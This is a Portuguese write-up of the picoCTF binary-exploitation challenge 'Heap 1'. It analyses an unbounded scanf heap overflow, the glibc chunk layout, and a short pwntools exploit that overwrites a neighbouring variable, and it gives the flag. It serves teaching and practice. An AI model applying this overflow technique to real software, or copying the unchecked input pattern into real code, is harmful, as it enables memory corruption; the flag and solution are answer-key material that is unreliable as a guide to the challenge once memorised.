# Heap 1

**Autor:** Abrxs, pr1or1tyQ\
**Plataforma:** CyLab (picoCTF)\
**Categoria:** Binary Exploitation\
**Dificuldade:** Médio\
**Data:** 2024\

**Descrição do desafio:** 
> Can you control your overflow?

---

## 1. Análise do arquivo fornecido

O desafio entrega dois arquivos: o código-fonte `chall.c` e o binário `chall`. O objetivo é fazer o programa imprimir a flag, que só é mostrada quando `check_win()` encontra `safe_var == "pico"`.

O menu do programa tem cinco opções:

1. Print Heap
2. Write to buffer
3. Print safe_var
4. Print Flag
5. Exit

As funções relevantes são `init()`, `write_buffer()` e `check_win()`. Em `init()`, o programa aloca dois buffers de 5 bytes no heap:

```c
input_data = malloc(INPUT_DATA_SIZE);  // 5 bytes
strncpy(input_data, "pico", INPUT_DATA_SIZE);

safe_var = malloc(SAFE_VAR_SIZE);      // 5 bytes
strncpy(safe_var, "bico", SAFE_VAR_SIZE);
```

Em `write_buffer()`, a entrada é lida sem limite de tamanho:

```c
scanf("%s", input_data);
```

Em `check_win()`, a flag é impressa se `safe_var` for igual a `"pico"`:

```c
if (!strcmp(safe_var, "pico")) {
    // imprime a flag
}
```

---

## 2. Identificando a vulnerabilidade

O `scanf("%s")` não respeita o tamanho do buffer. Qualquer entrada maior que 5 bytes escreve além de `input_data` e sobrescreve os dados vizinhos no heap. No glibc, `malloc(5)` gera um chunk de 32 bytes, com 24 bytes utilizáveis. O chunk seguinte começa depois do cabeçalho, então `safe_var` fica 32 bytes após `input_data`:

```
input_data ─┐
            ├─ 0..23   dados utilizáveis de input_data
            ├─ 24..31  cabeçalho do chunk seguinte (sobrescrito sem problema, pois nada é liberado)
safe_var ───┘ 32..     dados de safe_var
```

Portanto, ao enviar 32 bytes de preenchimento seguidos de `pico`, `safe_var` passa a conter `"pico"`.

---

## 3. Exploit final

Primeiro, enviamos o payload pela opção 2. Depois, escolhemos a opção 4 para chamar `check_win()`.

```python
from pwn import *

p = remote("HOST", PORTA)
p.sendlineafter(b"choice: ", b"2")
p.sendlineafter(b"buffer: ", b"A" * 32 + b"pico")
p.sendlineafter(b"choice: ", b"4")
print(p.recvall(timeout=2).decode(errors="ignore"))
```

## Flag

```
academy{starting_to_get_the_hang_684e40ef}
```

---

**Autora da WriteUp:** [Membro de Exploitation - lieserl](https://github.com/lieserl-git)
